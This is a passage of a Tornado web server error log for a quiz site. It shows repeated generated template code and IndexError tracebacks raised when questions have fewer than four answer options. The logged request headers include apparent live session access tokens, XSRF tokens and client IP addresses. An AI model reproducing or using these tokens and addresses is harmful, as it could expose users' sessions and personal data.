 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6b818e4c854816f48743&answers=%5B2%5D&cursor=10&_xsrf=c61bbcc368ff43dfae27f2c753f54e78', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '109.158.140.86', 'Origin': 'http://www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'X-Privly-Version': '0.0.7', 'Referer': 'http://www.intheory.co.uk/test/new', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1348162371.1348168472.3; __utmb=188782963.5.10.1348168472; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 85.29ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6b818e4c854816f48743&answers=%5B0%5D&cursor=15&_xsrf=c61bbcc368ff43dfae27f2c753f54e78', headers={'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '109.158.140.86', 'Origin': 'http://www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'X-Privly-Version': '0.0.7', 'Referer': 'http://www.intheory.co.uk/test/new', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1348162371.1348168472.3; __utmb=188782963.5.10.1348168472; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 84.00ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6c9c8e4c854816f48744&answers=%5B3%5D&cursor=4&_xsrf=5cecc491f1154f6ebcbdcc1e0076e69b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.144.60.190', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFDWXZaQkRzaFNiVjBZWkFaQlpCanBDbE91cWdOa2FISnNmeGRJelNHZmRrREV3ZTM4bExIUHRaQ3k5YXVNaWY4aVlTZVRKOUxaQnExOU11VUU4YlpBbzhjYkNnOFNWY1FaRFpE|1348165845|d2f682bbefb8d68369387848ec4c41326a08626b; _xsrf=5cecc491f1154f6ebcbdcc1e0076e69b; __utma=188782963.1727938829.1348165807.1348165807.1348168841.2; __utmb=188782963.3.10.1348168841; __utmc=188782963; __utmz=188782963.1348165807.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 114.58ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
